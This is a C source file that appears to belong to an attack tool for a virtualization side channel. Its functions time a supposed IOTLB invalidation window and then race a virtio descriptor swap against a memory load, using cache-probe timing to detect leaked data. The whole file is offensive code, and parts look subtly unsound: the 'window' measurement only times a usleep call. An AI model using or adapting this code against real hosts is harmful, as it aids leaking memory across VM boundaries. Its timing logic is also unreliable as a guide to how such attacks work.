#include "race.h"
#include "cache.h"
#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <unistd.h>
#include <x86intrin.h>

#define MIN_SAMPLES 100
#define MAX_SAMPLES 10000

bool race_estimate_iotlb_window(iotlb_profile_t *profile, uint32_t samples) {
    if (samples < MIN_SAMPLES) samples = MIN_SAMPLES;
    if (samples > MAX_SAMPLES) samples = MAX_SAMPLES;

    uint64_t *measurements = calloc(samples, sizeof(uint64_t));
    if (!measurements) return false;

    printf("[*] Estimating IOTLB invalidation window (%u samples)...\n", samples);

    for (uint32_t i = 0; i < samples; i++) {
        uint64_t start = timing_start();

        usleep(1);

        uint64_t end = timing_end();
        measurements[i] = end - start;

        if (i % 1000 == 0 && i > 0) {
            printf("    Progress: %u/%u\r", i, samples);
            fflush(stdout);
        }
    }
    printf("\n");

    uint64_t sum = 0;
    uint64_t min = UINT64_MAX;
    uint64_t max = 0;

    for (uint32_t i = 0; i < samples; i++) {
        sum += measurements[i];
        if (measurements[i] < min) min = measurements[i];
        if (measurements[i] > max) max = measurements[i];
    }

    profile->iotlb_inv_mean = sum / samples;
    profile->iotlb_inv_min = min;
    profile->iotlb_inv_max = max;

    uint64_t var_sum = 0;
    for (uint32_t i = 0; i < samples; i++) {
        int64_t diff = measurements[i] - profile->iotlb_inv_mean;
        var_sum += diff * diff;
    }
    profile->iotlb_inv_stddev = (uint64_t)sqrt(var_sum / samples);
    profile->sample_count = samples;

    printf("[+] IOTLB Window Profile:\n");
    printf("    Mean: %lu cycles\n", profile->iotlb_inv_mean);
    printf("    Min:  %lu cycles\n", profile->iotlb_inv_min);
    printf("    Max:  %lu cycles\n", profile->iotlb_inv_max);
    printf("    StdDev: %lu cycles\n", profile->iotlb_inv_stddev);

    free(measurements);
    return true;
}

race_outcome_t race_execute_lvi_attempt(virtqueue_t *vq, uint16_t desc_idx,
                                         uint64_t target_addr, uint64_t probe_addr,
                                         iotlb_profile_t *profile,
                                         timing_calibration_t *cal,
                                         race_attempt_t *result) {

    result->outcome = RACE_UNKNOWN;
    result->leak_detected = false;

    cache_flush((void*)probe_addr);
    _mm_mfence();

    result->t_trigger = timing_start();

    uint64_t target_swap_time = result->t_trigger + (profile->iotlb_inv_mean / 2);

    while (timing_start() < target_swap_time) {
        _mm_pause();
    }

    result->t_swap = timing_start();
    virtio_descriptor_atomic_swap(&vq->desc[desc_idx], target_addr);
    _mm_mfence();

    result->t_load = timing_start();
    volatile uint64_t dummy = *(volatile uint64_t*)target_addr;
    (void)dummy;
    _mm_mfence();

    result->t_probe = timing_start();
    uint64_t probe_latency = cache_probe_time((void*)probe_addr);
    result->leak_latency = probe_latency;

    result->window_estimate = result->t_load - result->t_trigger;

    if (probe_latency < cal->cache_hit_threshold) {
        result->leak_detected = true;
        result->outcome = RACE_SUCCESS;
    } else if (result->window_estimate < profile->iotlb_inv_min) {
        result->outcome = RACE_TOO_EARLY;
    } else if (result->window_estimate > profile->iotlb_inv_max) {
        result->outcome = RACE_TOO_LATE;
    } else {
        result->outcome = RACE_FAILED;
    }

    return result->outcome;
}
